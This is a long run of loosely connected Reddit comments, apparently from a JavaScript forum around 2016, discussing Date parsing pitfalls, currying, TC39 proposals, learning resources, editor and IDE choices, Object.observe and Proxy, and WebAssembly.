I think you misunderstood what I was saying. I am not saying that I haven't had a null pointer (undefined is not a function) exception before. I had them all the time. I even believed at one time that the existential operator would be a great addition. I now have a different opinion. I use static type checking (Typescript/Flow) to know the types of my objects. It makes my code have a lot fewer errors. If I have a third party service, I define the types that can be returned from that service. You can't program against an interface that is unknown. If interface changes or is unknown, how do you know whether you are even looking at the correct field? I would rather get a hard error than my program doing something incorrect. Hopefully that makes sense. The existential operator has not even become an official proposal yet. The discussion you linked to isn't part of the standards process. Here is a list of official [TC39 proposals](https://github.com/tc39/proposals). [ES2016 (ES7)](http://www.ecma-international.org/ecma-262/7.0/index.html) was already released in June. The existential was not a part of the spec. If the existential operator does become an official proposal, it would at best be in ES2018 (ES9). I don't think it will, as I mentioned earlier. 
For the curious, how is Linux better than MacOS for development?
Fun story: this exact behavior caused a production bug at my workplace. The fact that unspecified 8601's are being parsed as local time is actually new behavior in ES6; it used to be UTC. So if you had code that counted on UTC when the browsers transitioned to the new spec (as we did), you were in trouble. One of the rare cases when browsers breaks an API (excluding deprecations of course).
Awesome, I appreciate the detailed response. thanks 
Thanks dude, started and finished the all 3 parts of javascript today! Could never transition from C++ because of the weak typing. Having a proper in-depth tutorial helped a lot!!
I'm pretty underwhelmed by the react course. http://campus.codeschool.com/courses/powering-up-with-react/, the other ones found in search are pretty much only short videos.
&gt;is abstraction over arity. i give this article huge props for actually trying to explain why currying is actually useful. most articles just explain what it is, give a simple example with addition, then say have at it. fortunately the rest operator `...` also abstracts arity in es6+
You are trying to get 1 person to fill 3 roles : &gt; I need someone to advise me on the scope and feasibility of said project Consultant / analyst &gt; advise during the development of it Coding mentor &gt; and discuss success criteria before and after completion of the project. Project manager (not to mention you're using the waterfall approach instead of agile, which works when things are academic but real world it doesnt).
It was over 10 days, and he was sober IIRC.
Doesn't `Function.prototype.bind` satisfy both points 2 and 3? It's a native way to do currying and it explicitly sets `this` to whatever the first argument you pass it is. It does have the issue of not being able to change `this` afterwards, though.
 answer who the fuck knew that beforehand Those who RTFM
Fuck dates. Convert to Unix timestamp as soon as you get the data and only convert it back to time when you actually need it. Solves 99% of my problems. 
Yeah, that's because when I last tried, the production optimised version of React didn't support component recursion.
I started that egghead course but just put it on hold for this codeschool weekend and I think their ES2015 course is definitely helping with understanding Redux. I agree though, so far I'm getting it. I did the React / Redux course on Pluralsight and a few other tutorials including the Redux official one and thought I'd got it. Nope! What I've done so far of the basics of the Dan Abramov course it is all finally clicking into place
&gt; or _everything_ is local. Quick. 04/05/06. Is it: 1. April 5, 2006 2. May 4, 2006 3. May 6, 2004
I need to read the manual every time I dare to type `new Date`, since I never remember the details.
MomentJS is a life saver. Dealing with date/time sucks to begin with, but it's worse in Javascript than any other language by a large margin.
Google what a for loop is and use that. Sit down with a piece of paper and do it by hand with varying values. Imagine you are explaining each step to a an alien that will do exactly what you tell it perfectly but it is a total dumbass and needs direct instructions. To solve this problem yourself you'll find you naturally create a "loop" When you get stuck like that just google it and it will come up.
Hi /u/p1ranhaHTML, we're not simply going to do your assignment for you; please attempt the problem and show us the result. Use an online service to post your code. Here are a few ways you can post your code: * [JSFiddle](http://jsfiddle.net/) for JS+HTML+CSS * [Codepen](http://codepen.io/pen/) for JS+HTML+CSS * [Github Gist](https://gist.github.com/) for simple JS/text dumps * [Pastebin](http://pastebin.com/) for simple JS/text dumps Please reply to this comment once you have done that and I will make the post public. Thanks!
cool. just checked it out and seems easy to set up, appreciate it. quick question - the app is running on a $5/month digitalocean droplet. would running the commands through codeship use less memory//disk space (?) than running the commands on the server? if so, is this enough to even worry about? If I continue doing what I do now, I would just 'build' before every git push and then pull that on the server
To add to the fun: new Date(2016, 12, 08); // Months are zero-indexed Sun Jan 08 2017 00:00:00 GMT-0500 (EST)
So your friend doesn't value his time?
^
Why are all his vids maxed out at 480p? Text based content like this reeeeeealy doesn't do well. http://imgur.com/a/bUDLZ
ha! "This is your first lesson"
I like reading Manning books. The EAP program is nice. This doesn't really have anything to do with my question, but why did your friend turn down the offer?
Maybe he'd rather establish himself as an authority and use that as leverage for future ventures? Maybe he just likes doing it as a hobby and doesn't want to deal with the whims of a publisher? Maybe he's not some variant of you and does things his own way, and is perfectly happy?
He believes that education should be free.
Great article! I love the "Mostly Adequate Guide to FP". It's a much more approachable version of this same content: https://www.gitbook.com/book/drboolean/mostly-adequate-guide/details
I'd be curious to hear if anyone has stories of moving to the Pointfree style in their day job. How has this impacted readability and computational performance?
My speakers are better than most. Maybe small speakers or earbuds you won't be able to hear some of the issues but I can hear him peaking when he talks and there is hiss throughout. Mic boost sounds like exactly what happened. If it wasn't done in post then it needs rerecording. It hurts my ears to listen to it.
what?
Just the thing I was looking for.. perfect!
I would say, learn a server-side language to complement the front end language (setting aside Node since the question is about a non-JS language). Maybe python/Django or pypy, Ruby on Rails, php7, etc. 
I honestly dont think you should be concerned about that. Codeship is just an automation tool, so instead of you doing everything manually, you let Codeship do the work. I'm not sure about the exact commands you run, but im sure it can be automated so that all you have to do is push to git.
&gt; I use JS on my backend I learned not long ago that time since unix epoch can actually be configured to be based on UTC or not based on UTC. Fortunately UTC is the typical default but there are no guarantees you won't install on a system that configures it all fucky. God damn it date time bullshit sucks!
I think good code comes with good guidance and education. In my experience a lot of front-end developers come from a design/communication background. While most back-end devs are coming from IT/development oriented studies (just in general). In the case of Javascript, the majority used to be copy pasting jQuery scripts from Google. Times have changed, SPA's became complex and I think there are a lot of people "learning React or Angular", not realizing they should learn general programming and Javascript as a language first. Not to speak of Javascript now being a full fledged back-end/server side language too. Fading the border between back-end and front-end developers.
Dependency injection (to add to the other things mentioned). You can also use it to avoid needing Function.bind For example: https://jsfiddle.net/bbe2md46/
Thanks for this.
I will give you an example. function createLogger(className, configuration) { // Depending on the potentially complicated oncfiguration // one could log this messages to a REST service // and to the console as well if (configuration &amp;&amp; configuration.logToDB) { return function (msg, level) { switch (level) { case 'warn': // Make request to REST service here console.warn(msg, 'In class ' + className); break; case 'error': // Make request to REST service here console.error(msg, 'In class ' + className); break; default: // Make request to REST service here console.log(msg, 'In class ' + className) } } } else { return function (msg, level) { switch (level) { case 'warn': console.warn(msg, 'In class ' + className) break; case 'error': console.error(msg, 'In class ' + className); break; default: console.log(msg, 'In class ' + className) } } } } var log = createLogger('Player'); // This method will log to the console log('Player not found'); var dbLog = createLogger('Player', {logToDB: true}); // This method will log to the console and also send the logged string to some // database somewhere for collection and posibbly later analization. dbLog('Player not found', 'warn'); This is a simple example but I think you can see the advantage.
I find his explanation of ES6 classes confusing, because he's explaining and highlighting ES5 (pre 2015) code and at the same time saying that "this is the way we define classes now", so the timing seems off. Over the next two minutes, this is cleared up, but hey, that could have gone smoother ;) I agree with other commentors on the quality of video and audio. 
I wrote a lot of code in Pointfree style and... ...it wasn't as amazing as I'd hoped. It feels great to write, but I'm struggling to get used to *reading* it. I often feel like from a maintainability perspective I'd be better off with a few ES6 arrow functions and being explicit with what I'm doing, rather than a bunch of clever chained Ramda functions written in a Pointfree style. It's frustrating, because I want it to work, but I really don't enjoy returning to the code I wrote in that style compared to similar code written in a more "standard" style with anonymous functions. Especially given how concise ES6 can be now.
Any XSS Filtering?
Try testing some positive and negative cases and see how robust this approach is: I feel these regular expressions pick up a lot of undesired edge cases (worse if you apply them over each others output).
My personal favorite is `new Date('2015-01-01')` vs `new Date('2015-1-1')`
My favorite is that something like `new Date(2016, 0, 100);` is completely valid and gives you a date in April, however `new Date('2016-01-100');` isn't (which is the more sane solution).
^^ added.
First of all, you're going to want to use webpack. Second of all, you're going to have two distributions: one where `output.libraryTarget = 'commonjs2'` and one where `output.libraryTarget = 'var'` but you'll want to append `window.yourLibraryName =` to the front. (at least I think that's the best way of doing it). The `commonjs2` bundle is going to be the distribution you'll set as the entry point for the npm package. The `var` bundle is going to be the distribution you give out to set a global variable.
[ISO 8601](http://xkcd.com/1179/)
[Image](http://imgs.xkcd.com/comics/iso_8601.png) [Mobile](https://m.xkcd.com/1179/) **Title:** ISO 8601 **Title-text:** ISO 8601 was published on 06\/05\/88 and most recently amended on 12\/01\/04\. [Comic Explanation](https://www.explainxkcd.com/wiki/index.php/1179#Explanation) **Stats:** This comic has been referenced 697 times, representing 0.5113% of referenced xkcds. --- ^[xkcd.com](https://www.xkcd.com) ^| ^[xkcd sub](https://www.reddit.com/r/xkcd/) ^| ^[Problems/Bugs?](https://www.reddit.com/r/xkcd_transcriber/) ^| ^[Statistics](http://xkcdref.info/statistics/) ^| ^[Stop Replying](https://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=ignore%20me&amp;message=ignore%20me) ^| ^[Delete](https://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=delete&amp;message=delete%20t1_da87chl)
A few things. You are doing an assignment instead of a comparison. You want to compare light to the string "green". if (light === 'green')
Why convert it in the first place? 
Gatsby
Also has a great Laravel series. If you want to learn Laravel I recommend his channel.
It is mainly meant to raise discussion. I haven't completely convinced myself yet, I moved the issue to jsx issue tracker with some more info of what kind of problems this would solve: https://github.com/facebook/jsx/issues/68
CodeSchool is a Pluralsight company ;) 
jQuery is a very popular library, it does a lot of good things, and for many people it has effectively replaced the Javascript itself. With good understanding of underlying principles of JS (and, maybe, more importantly, with good understanding of problems that jQuery was made to fix) it shouldn't be too difficult to understand. There are a lot of tutorials and introductory docs out there (I unfortunately cannot personally vouch for any), but maybe if you shared more about the specific issues you're having with it, we could help more? Ask away. 
$(function(){ $('#something').on('mouseenter', someFuncHere) }) Try something like this
Use === not == for checking equality. It will save you much confusion and "wtf" down the road. 
I dunno. I can read other files in that folder just fine. Plus, if I disable security.fileuri.strict_origin_policy, the error does not show up, but neither does the response
Now that I'm watching some videos on Pluralsight, it's starting to make more sense. I was having a little bit of trouble figuring out how to determine the difference between a getter and a setter. I think my confusion is mainly around AJAX as far as its syntax and how it works. If I come up with any specific examples, I'll post them.
http://codesketch.gnikoloff.com (WIP) Updated my portfolio collection of animations with 2dCanvas / WebGL. Any feedback on performance and tips are more then welcome
Flow doesn't give you async/await. You'd also need Babel. I prefer having TS as an all in one solution. 
Oh. Well it will soon; I've been using async/await in it for a while now so I'm guessing it just hasn't gone public yet (FB employee)
It's only truly an Unix Epoch timestamp if it is UTC. If it's not UTC, then you have something that looks like a Unix Epoch timestamp but actually isn't.
You're probably using it in combination with Babel?
No idea to be honest, it all just works
http://www.reddit.com/comments/5dtsfi/_/da88y7g?context=3
Just FYI, you can use Vue with JSX.
What IDE are you using?
Seems like atom.
Default Webstorm with Monokai theme. I just started to make a switch to it from Atom and am really starting to like it. Too bad the licence is a bit pricey.
[My IDE is Unix](http://blog.sanctum.geek.nz/series/unix-as-ide/) and the [text triumvirate](http://www.drbunsen.org/the-text-triumvirate/) [Screenshot](https://upload.teknik.io/NVnSY.png) | [Dotfiles](https://github.com/DanielFGray/dotfiles)
Probably a lot can be done with Atom when you put in some plugins, but the things I like so far: - autocomplete / "intelisense" is a lot more smart; I've tried tern in Atom but it was extra clunky and slow - Refactoring - "Go to" things like usage, declaration, - built in (I had some of those in Atom with plugins) terminal, todo list, "Run" (a shortcut to package.json defined commands) - it's way more faster and more stable when working with big projects
[removed]
what font you using? and theme?
Nice choice in ide. I use phpstorm myself (have to work with php in job). You should check out the material theme package. It looks gorgeous. 
very clean. Wish I could wrap my brain around all the VIM bindings but switching right now would tank my productivity too much :( What's up with the different syntax highlighting on the extension of your css file import? 
[SublimeText 3, Material Dark theme, Sidebar Enhancements plugin.](http://i.imgur.com/yUHJ58L.png)
Sunburst is nice! In SublimeText speak though, sunburst is just a color scheme, a 'theme' is a full editor theme
Webstorm is actually € 59.00 for individuals: https://www.jetbrains.com/webstorm/buy/#edition=personal
It's worth the money imo.
jesus the coloring
Yup - that's what I was talking about. There's this little thingy on the sidebar with [npm] on it :) 
The personal licence can be used for any purpose, so long as an individual is paying for it out of their own pocket (and not claiming business / company expenses). So if you actually have a _company_ (i.e. an incorporated one) then yeah you would need the commercial licence.
Any recommendation for a black theme for Brackets? I'm using the dark one but want to see what other people use.
A few seconds startup time for a powerful IDE? One that can create scratch files, or open files outside of the project? Weak argument imho. The menus are slow? Most actions have hotkeys, the menus even tell you what they are. Settings and sub-setting dialogs all have filter search. You're complaining about petty things if we're talking about IDEs. IntelliJ ships with feature such as: - a kick-ass inspector - version control UI - database UI - build system integration - virtual terminal emulator - structure tree - debugging - test integration - docker integration - REST UI - plugin ecosystem (rice it just like sublime and atom) atom, sublime and vim all can support many of those features ad-hoc, but I'd hardly call the experience integrated. The closest I've seen in that regard would be [platformio](http://platformio.org/). Don't get me wrong, I still have atom installed as a text-editor with an inspector and a few other tweaks, but it pales in comparison to IntelliJ.
I don't think you fully understand JSX...
Great book: https://pragprog.com/book/dnvim/practical-vim Great game: http://vim-adventures.com/ The built-in tutor: `vimtutor`
I don't remember for sure but I think intellij can be used in place of webstorm by setting up the js interpreter or something.
Am going to add some more functionality to the app soon.. than I think we can apply to design process :) thanks for appreciating though
If I'm remembering correctly I think atom and webstorm share a lot of similar shortcuts.
Thanks for the link, I'll look into it some more. I'm self-employed, but can get the licence and not claim it to get tax return if that's a way to get around getting business licence ;) 
Grats on the move! I mostly work front-end, but every now and again I have to touch the old php. That syntax gives me nightmares.
Unix as ide was cool. Thank you!
not sure why you got downvoted -- I don't disagree with you. But I think for the work a lot ( most? ) web devs do, a lot of those features go predominantly unused, and/or we have separate apps to handle those particular things ( and are highly polished for that task, instead of one-app-trying-to-do-everything ). Entirely personal preference though. Half my team uses IDE's, other half text editors, a couple vim users.. Whatever you're productive with at the end of the day. 😄
What is wrong with JSX?
and some indentation guide plugin apparently
most of the other IDEs in this family are a back end language + Webstorm, wrapped together. for example, I use PHPstorm for both PHP and Javascript, HTML, CSS/SASS, and React/React-Native with JSX. it's awesome being able to code my full stack in one place.
Sweet, wasn't sure about it being default yet :) shoulda known for webstorm though.
Hi /u/icantthinkofone, there's no need for insults.
Sublime Text with Materialize (A fork of Material Theme). [Screenshot](http://i.imgur.com/CYnXwD1.png)
Same :D
You're missing a closing brace `}` for your `constructor`, but after fixing that you can just paste your code to http://babeljs.io/repl and see the transpiled code on the right side.
Here's a place to start to get your library up to standards: https://egghead.io/courses/how-to-write-an-open-source-javascript-library
Now kiss
A company selling you a license will never see your tax return, and a license can't force you to not take a deduction for something you've purchased for your business. The only "protection" a business license offers is that the copy licensed to a business allows the business to replace the user and not the license. If Frank buys his own copy to work for Company Z, then when Frank leaves he takes his copy with him. If instead Company Z has a license to allow Frank to use the software when Frank leaves his replacement Lauren is also able to use the software without a new license.
Totally agreed, but do remember carpenters will use free things when available as well. It's not just about cost, it's about cost vs. value. If something doesn't provide enough value to be substantially better than the free alternative, then lots of folks won't spend money on it.
Can someone help please?
&gt; That game is so fucking annoying. How do I move? What's the objective? Why can I only move the "cursor"? BASHDuASdguadh The game must be well made because this is how I feel trying to do anything beyond small edits with vim
Why not add Vue support to next.js?
Thanks. But why overkill? It is pretty small. Actually just before I started refactoring it to make it lib and publish it, it was just 30-50 lines of code. And the core diff between serial and parallel was the way of looping.
Sweet! I'm building a small blog and I want to be able to use a markdown parser that allows inline html (for stuff like adding css classes mainly) AND does XSS filtering. At the moment I'm using showdown.js
Hi /u/Krs8211, please ask specific questions. Otherwise, you might try /r/learnjavascript.
It looks like NetBeans with the default theme. (Tell my wife I said "Hello".)
This is cool. It could be helpful to say how normal fetch handles error codes. 
A search engine on the internet. Maybe you've heard of those things.
Thanks, so I figured it out, it's just a normal function constructor: _this.tapThing = function (index) { if (index === _this.state.activeIndex) return; _this.setState({ activeIndex: index }); }; 
Math.round looked hard to use if i wanted more decimals so converted it to a string instead. Thanks for the help!
I used to use Sublime heavily, but recently switched to VisualCode Studio and quite like it so here is mine: https://imgur.com/a/Mfa8j Theme: Monokai File Icon Theme: Ayu Font: Menlo
Have you not noticed all the complaints from CodePen? You don't put the whole HTML document in the HTML panel; the JavaScript and CSS should be split out into their own panels.
You might want to tinker around with plain C first for a while. C is actually kind of similar to JS in its stupid simplicity. C++ is rather massive and it might help to get a handle on the lower-level concepts of pointers and memory allocation before you start trying to use C++'s higher-level features.
I'll have to look it up again but I had previously found references to how to configure it. If you can configure the epoch time I'm not sure why it wouldn't still be epoch time. Either way it's bizarre.
Personally, I don't recommend that. Many C-style solutions are considered bad practice in C++, so if learning C++ is the goal, then learning C first can actually be counter-productive.
What makes you prefer Vue over React? As someone who has only used React, I'm curious to know any advantages you think Vue may have over React.
Why?
Hi /u/coachunt, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
But Still it is in proposal stage.
TypeScript has [an online playground for this as well](http://www.typescriptlang.org/play/) for the record.
I used a similar analogy when talking to someone a few days ago. Even junior developers should make enough money to afford $129 a year. Even if you can't afford that, it's $13 a month.
VS Code with Hasklig font and One Dark color theme. [Screenshot](http://oi65.tinypic.com/2i1eaag.jpg). 
Did Eich ever apologise for supporting prop 8?
This is hilarious. I remember seeing Reddit plastered with Backbone, then Angular, then React. Oh man, the churn is real. 
Of course. If someone is looking at a 100 bucks tool, vs a free one, and they are very close in value, sure, go for the free one. My problem is when people are like "I really want this!!!" and won't shell out. Then obviously there was value. And god forbid they pirate it (the amount of engineers I know who make 150-250k and will pirate software they use every day is ridiculous.
Fira Code is a great font. The ligatures make a huge difference, especially for arrow functions
The thing is if I want to deduct something from my company taxes (in Poland at least) I need to have an invoice with my company data from the seller - and I guess that when getting a personal licence I will not get such a thing from them.
What terminal window emulator plugin is that? I need a new one since terminal plus broke 
Just a heads up but you can mix the ligatures of Fira Code with Operator Mono (as shown in my screenshot).
Operator Mono and One Dark in Atom
You can probably find out everything from [this thread](https://esdiscuss.org/topic/an-update-on-object-observe) on esdiscuss, but generally because Proxy exists and there are better patterns for observing changes.
Checkout Scott Frees native add-on series: https://blog.scottfrees.com/getting-your-c-to-the-web-with-node-js The 4 part series is good. In it he talks about his book on the subject. I'm half-way through it and would recommend it. Happy hunting.
I kind of rush read through the article on this text triumvirate. I realized upon second reading that it actually was referring to how to use vim and a few other tools together.
Editing with Vim is a complete paradigm shift, it can take a little while to adjust, but I don't think it takes as long as you might think, and I really think the time spent learning is well worth the investment. One thing that helped me when I was learning, was using it every chance I could, and when I got stuck on something and didn't want to waste time figuring it out, I would make a note of what the problem was, and then come back and try and figure it out again later when I had more time. I'm not sure about the highlighting of the file extension, I actually hadn't noticed until now..
Perf was terrible. So they came up with something better. 
I have a passing familiarity with Next.js upon which this framework is based upon and minimalist is likely in context of how one approaches writing and connecting code together, as in it's rather, well, minimal. As for the choice of dependencies being, and I quote, "shit packages," that's just like your opinion, man. If you can do it differently, please do so! I love learning from the community where possible. If you cannot, then please refrain from referring to the work of others in the community as, quoting again, "shit."
I can't tell if you're being sarcastic or not. 
Wellcome to the JavaScript world.
It's actually still in Stage 1: https://github.com/tc39/proposals. It's got to be more performant and I think I recall Jafar saying he wants to wait to see how other libraries like RxJS carry out before finalizing this spec.
Observable is different than Object.observe. Maybe someday they will bring back Object.observe using Observable though. 
In *~~principal~~* *principle*, they were useful. In practice, the implementation didn't really work very well. Plus proxies popped up as an alternative idea, and it turns out that everything you can do with Object.observe you can do better with a Proxy, so... Not *every* solution to a problem needs to be implemented; just the best ones. Edit: Thanks /u/nikcorg :)
&gt; Perf was terrible. Do you have any benchmarks? I didn't run into any perf issues-at least in chrome. I thought the reason was just that Proxies are lower level abstraction and are applicable more widely.
&gt; waaay more performant. any benchmarks to back it up?
After using ES6 for more than 3 years now I can tell you that it would be hard going back. Besides fat arrows that you already mentioned, things like destructuring, default parameters, rest and spread operators, template strings, and even "small" things like shorthand object properties, or computed properties, make the development experience much better. At least in my opinion. I'm not a big fan of classes, I prefer a more functional approach to programming, even though they are more of a syntactic sugar on top of functions. But people were using classes anyway, so it is good to have a standard way of doing things. So if you ask me yes, it has a lot of the advantages that you would want. The only thing for me that is missing is immutability. But who knows, maybe in some future version. :)
Looks it. I happen to work with the guy that made it :) It is pretty great.
Psst... it's in principle, not principal.
neovim, minimal setup, solarized dark theme, relative line numbers, no syntax highlighting (only comments are a bit darker). Screenshot: https://i.imgur.com/m1oBo1I.png
phpStorm with black theme. I like black backgrounds in IDEs, feels like my eyes aren't getting tired as fast as with white backgrounds.
I don't have any benchmarks, but the Angular and Polymer teams tried implementing it and found it to be performing really poorly. The best article I could find on short notice is this: https://www.infoq.com/news/2015/11/object-observe-withdrawn Proxies perform their operations much more efficiently, essentially abstracting to the getters and setters we know and love.
That is really useful 
$200 font on a free editor 😀
Notepad.exe runs great on OS X. 
If you set `request.redirect = 'manual'`, you probably don't want a 300-series response to be an error.
filter and map is not ES6. They're ES5. EDIT: Here's an example using at least map. https://jsfiddle.net/0etm99cv/6/
I never understood need for "cool" nerd setup like vim as IDE etc. Here is mine: http://i.imgur.com/Fu3tcqk.png PHPStorm FTW!
Dah ... Maybe because it comes built-in in the "Open with..." Context menu ?! /SarcasmOff
So what are the advantages over [Massive.js](https://github.com/robconery/massive-js)?
They don't per default, but you can make them by calling the prototype method and specifying the NodeList as the this param, e.g.: Array.prototype.map.call(myNodeListHere, function(myNode) {...}) Or, you can get a true array by calling the slice prototype of the array: Array.prototype.slice.call(myNodeListHere); If you only have an interest in using ES6, you could do the following: const myArr = [...myNodeList]; or const myArr = Array.from(myNodeList); 
Oh, awesome!
Is there any reason why they wouldn't be able to do that?
MDN is always a good source if you need more information about any JS related stuff, for example [their page about observe](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Object/observe) explains: "The Object.observe() method was used for asynchronously observing the changes to an object. It provided a stream of changes in the order in which they occur. However, this API has been deprecated and removed from browsers. You can use the more general Proxy object instead." And here is the page about [proxy](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy). But the problem with proxy is that it is not widly supported yet, so you will want to use a ponyfill or polyfill like the one from google: https://github.com/GoogleChrome/proxy-polyfill.
No. In 2.0 they already do tree shaking which means an extensive static dependency analysis already exists. They just need to use this information to emit unmangled code
No. In 2.0 they already do tree shaking which means an extensive static dependency analysis already exists. They just need to use this information to emit unmangled code
About the "performances" parts I saw this and it sounds like "no one wins" https://jsperf.com/comparison-of-comparisons (on my ubuntu chrome == is faster in both cases but just a little bit) But I'll be happy to have a feedback from someone who's been working on a JS engine
Oh the irony.. 
I can't help but chuckle at "starting at line 67" bit in an article talking about bundling two god damned lines of code together. 
You can configure the javascript pane [https://codepen.io/pen/](https://codepen.io/pen/) to use babel in the javascript pane settings. Afterward, in the javascript pane's dropdown menu, you can "view compiled js" to see the transpiled result of your code as well.
[Same here](http://imgur.com/HHbMxZh) on top of i3, font is Source Code Pro by adobe. Tomorrow night color scheme. I'm also trying [vscode](http://imgur.com/zLfuabS) those days, with vscode vim extension, may be a replacement once they've enough features... 
come on boys, use [objection](https://github.com/Vincit/objection.js) or directly [knex](http://knexjs.org/)
Proxies make new objects, object.observe monitors exisiting... Not entirely apples to apples.
what do you have going on in the lower bar?
I agree with you. But, in the end, the developer would get an error message as well, so it wouldn't be much different than how it is right now with the return statement issue. What is important here is that typescript doesn't let you silently fall into the world of undefined behavior.
Being a superset, all JS has to be able to pass through the TS compiler unscathed, including the stuff that relies on ASI quirks. Unfortunately.
You mean `ctrl+`` to get access to the inside terminal? You can use tmux inside it: http://imgur.com/WMDTapg
Just like `vim $(grep -Ril 'something')`...
Brian is functional inside. Almost everything he published is worth reading/watching (more than once).
Thanks for the feedback. I've updated the article and included the trivial solution (using parentheses).
State shouldn't be modified with ++state.goods
Mhmm I like self-depreciation in my software
This guide is much more approachable than the other functional programming material out there which tends to be academic.
I work in a large project with sublime and it opens instantly. :-) Not trying to start a preferences war here though. Use what makes you productive. I find the clutter in an IDE unnecessary and distracting, and most of the time the features go unused. That's just me though. Use what you like. 
I've tried this code, but it doesn't seem to work! [Here's a JSFiddle]( https://jsfiddle.net/d663s4bw/) Any idea what's happened? Also sorry! I know my code's a bit hard to read. I'm working off of the basics of Javascript I've been able to figure out from web design, rather than from a programmer angle. 
Here's mine &lt;http://i.imgur.com/Sqzbwib.png&gt; OSX + Tmux + Oh-My-Zsh + NeoVim [Dotfiles](https://github.com/floscr/Dotfiles)
It sounds like ASM.js is rather a pre-compiled (and optimized) subset of javascript code that just gets passed-as-is to ~~JVM~~ *JSE/JSI*. This isn't really what I'm talking about at all. Or did I misunderstand something about ASM.js?
Ya I always have sublime for quick edits or weird files. The loading is insane
You don't want to compile on the fly. That's slow and resource intensive. Especially when converting from C++ or machine code, to a subset of a higher level language. There are lots of tests and checks involved to maintain integrity. Babel and TypeScript both compile on the fly for development purposes, but not meant for production use. The JVM is Java. I don't understand the relationship here. JavaScript is interpreted by V8, Spidermonkey, or Chakra. The compiled ASM.js code is not really similiar to Java bytecode. It's a restrictive set of JS functions that allow for the least amount of overhead by the interpreter.
I was thinking more in terms of "decompile on the fly". The "compiled" version (which really is just a binary version of the script - not a true compile) would be loaded and have the (still javascript) objects put into the DOM instead of having raw javascript put into the HTML. This would indeed increase load times (though not significantly) with no impact on run time. The ONLY advantage this would give you would be further "obfuscation" of your code.
It's a domain-specific language for the DOM. They need to have domain-specific idioms for server or CLI to work on the server-side. 
Nothing crazy, I think the only non-standard thing is the `atom-spotify` package for displaying my current Spotify track. 
I don't really undertand what you want but, maybe it's something similar to [WebAssembly](http://webassembly.org/).Also... Yeah, that won't be viable for some years. Edit: If you're that worried about having your code ripped off, just run your code server-side man. You're making things much more complicated than they need to be.
Explain what you meant when you mentioned the JVM. 
Eh, I've been working with Java lately and mistyped. The JavaScript Engine in the browser is what I'm referring to. Sue me.
Could you please rephrase your questions? Not sure what exactly do you mean... As I see, you're creating a 2D array (not official naming), just an array where each item is an array :) BTW, creating array with explicit constructor is not a common way in JS. You can type just as var basics = []; //an empty array or var basics = [ // the best way in case if you're just need to make an array with pre-defined elements ["Alpha", "a1", "1", ...], ["Alpha", "a2", "2", ...], ..etc.. ]; or var basics = []; basics.push(["Alpha", "a1", ...]); basics.push(["Alpha", "a2", ...]); etc...
It's a multidimensional array. Here's a StackOverflow answer about them: http://stackoverflow.com/questions/7545641/javascript-multidimensional-array
Why do you say that? I'm not contradicting, I'm legitimately curious. 
You've basically described WebAssembly: http://webassembly.org/
the location of the words {var basics,} {basics[0]}, {"Alpha", "a1"} as well as the whole row {basics[8] = ["Epsilon", "e1", "9", "Option 9", "i"];} that is what im asking for. What are each of the elements called? 
From what I understand, you want to create a js file that can interpret machine code, but you also don't want to put that interpreter in your .html file. is that it? First of all that's not how it works, the code would run on the client and you cannot hide your code from it. You can minify the code and obfuscate variable names, but that's about it. Even then making your user download a whole machine code interpreter to run it at runtime would't be the best option.
Ahhh, here we go. This does look a lot like what I'm looking for. So off the top of your head, do you know how close this is (or is it) to being adopted as a standard? As it is, it looks like only two browsers support it.
Opening up the console in your browser will probably give you a good hint.
Javascript doesn't have any specific arrays (I'm not talking here about Typed Arrays which is not relevant to your question). In Javascript you just have an array which may contain any items, and basically every item in the same array could be different type. It could be primitive data types (as string, number, boolean, etc..) or any other JS things as Object (including arrays), Function and anything else.
There's nothing special about a multidimensional array, other than the fact it is an array that contains arrays. Each element of an array can be whatever type of value, such as another array in this case. But it could also just be a string or number or object or whatever. And an array can contain more than one type of values, so it could have elements which are arrays right alongside elements that are strings, etc.
Are these files at the apex/root? Are you just opening the html file in browser (not using things like MAMP)? As /u/glidej said, open up that console.
I'm just in the experimental stages with JavaScript, and have seen a lot of Indy devs that are finding their HTML5 games ripped off line-for-line by asian scammers. If it's easy enough to do, they'll rip the code, swap out some minor graphics changes, and make your game available on their own sites for free (they get ad revenue). And there's nothing you can do, because China won't stop 'em. While the biggest names out there aren't even immune from this (for instance, "Legend of Titan" is a rip-off of Overwatch, there's a series of Pokemon knock-offs, etc.) it seems like just handing over the source code of your game is just begging [for stuff like this to happen](https://www.techinasia.com/chinese-studio-pirates-indie-game-cloudstone-developer-calls-reddit). For an Indy developer, a rip-off like that can make all the difference between a "just barely successful enough that I can now quit my job and work on my game full time" scenario, and a failed, "gotta keep my job because China's reaping the benefits of my work" scenario. With multithreading and hardware acceleration now available in JavaScript, I've been playing with the idea of making my game in it just for the simplicity of the distribution (my game wouldn't need anything as complex as Unity) but I'm not keen on the idea of just handing over the source code in plain-text to the Chinese. Even obfuscators don't do enough to hide the source. While I realize anything can be decompiled given enough time, it's a question of "is my game really worth the effort of ripping off?" If you're handing over the source code in plain text, and the effort is thus fairly non-existent, then of course the answer would be "yes". Even if my game was not at all popular. [Here's another interesting article on the problem.](http://www.gamasutra.com/blogs/MaryMin/20150915/253480/So_Your_Mobile_Games_Being_Pirated_in_China_A_SelfDefense_PostMortem.php)
My only problem with MDN is most of it reads like it is written in a fashion that assumes you already know what it's documenting.
I am not familiar with angular, but documentation[1] shows you can specify an action-specific url. So your **get** would look something like: 'get': { method: 'GET', url: '/api/testapp/', transformResponse: function (data) { if (data) { data = angular.fromJson(data); } return data; } }, [1] https://docs.angularjs.org/api/ngResource/service/$resource
Well, you'd have to target the div instead of the document.body, right? There are a few ways to get element(s), such as `getElementById`, `getElementsByTagName`, `getaElementsByClassName`, `getElementsByName`, `querySelector`, `querySelectorAll`, etc. See: http://www.w3schools.com/js/js_htmldom_elements.asp
Love this!! First time you read it, most of the core stuff will go over your head. Just keep coming back and it will start making more sense every time.
Ok so we're talking about games, it makes sense now, sorry. Browser really isn't a nice platform for commercial games, at least not yet... It's still nice for game jams or free/open source games where you just want to show off a simple game you made tho.
That was a directory-relative URI, so the fact that the HTML and JS files are in the same directory is sufficient; I think the problem is that the browser has restrictions on loading scripts from the local filesystem.
